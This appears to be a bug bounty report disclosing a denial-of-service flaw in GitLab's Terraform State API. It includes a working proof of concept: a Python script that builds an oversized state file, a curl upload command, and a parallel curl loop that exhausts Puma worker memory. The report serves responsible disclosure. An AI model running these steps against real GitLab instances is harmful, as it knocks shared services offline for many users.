## Report

####  Summary  
GitLab’s Terraform State API (`/api/v4/projects/:id/terraform/state/:name`) loads the entire requested state file into memory instead of streaming it in chunks. An authenticated attacker can upload an oversized, yet syntactically valid, `.tfstate` file and trigger multiple concurrent reads, exhausting memory on the Puma workers and crashing the service.


####  Asset  
`https://<GITLAB_HOST>/api/v4/projects/:id/terraform/state/:name`

---

####  Preconditions  
* Valid project membership with `Maintainer` (or any role that can upload Terraform states)    
* Personal access token (PAT) with **api** scope

---

####  Proof‑of‑Concept

#####  1  Generate an oversized state    
```bash  
###  !/usr/bin/env python3  
###  save as make_state.py  
import sys, random, json, os  
size_mb = int(sys.argv[1])                # e.g. 100  
out = sys.argv[2] if len(sys.argv) > 2 else "terraform.tfstate"  
serial = random.randint(100, 999)  
prefix = (f'{{"version":4,"terraform_version":"1.6.3","serial":{serial},'  
          f'"outputs":{{"dummy":{{"value":"')  
suffix = '"},"type":"string"},"resources":[]}'  
fill = size_mb*1024*1024 - len(prefix) - len(suffix)  
open(out, "w").write(prefix + "A"*fill + suffix)  
print(f"Wrote {out} (~{size_mb} MB)")  
```

#####  2  Upload the state    
```bash  
curl --request POST \  
     --header "PRIVATE-TOKEN: $PAT" \  
     --data-binary [@]terraform.tfstate \  
     "https://<GITLAB_HOST>/api/v4/projects/<ID>/terraform/state/foobar"  
```

Start with 50 MB, then 100 MB, 150 MB, etc. (very large files may be blocked upstream).

#####  3  Trigger concurrent reads    
```bash  
seq 100 | xargs -n1 -P20 -I{} \  
  curl --silent --output /dev/null \  
       --header "PRIVATE-TOKEN: $PAT" \  
       "https://<GITLAB_HOST>/api/v4/projects/<ID>/terraform/state/foobar"  
```

#####  Observed result  
* All 16 Puma workers allocate ≈ `N * file_size` bytes  
* RSS spikes; OOM killer terminates Puma → **GitLab web/API unavailable (~90 s)**    
* Logs: `pid X killed (OOM), score Y`

---

####  Impact  
* **Medium:** Any project maintainer can remotely crash every Puma worker, resulting in total loss of availability (DoS) for the GitLab instance.    
* Exploitation is inexpensive and repeatable; no rate limiting detected.    
* Can be abused by a single rogue employee in an on‑prem installation or by any paid‑tier customer in GitLab.com SaaS (multi‑tenant risk).
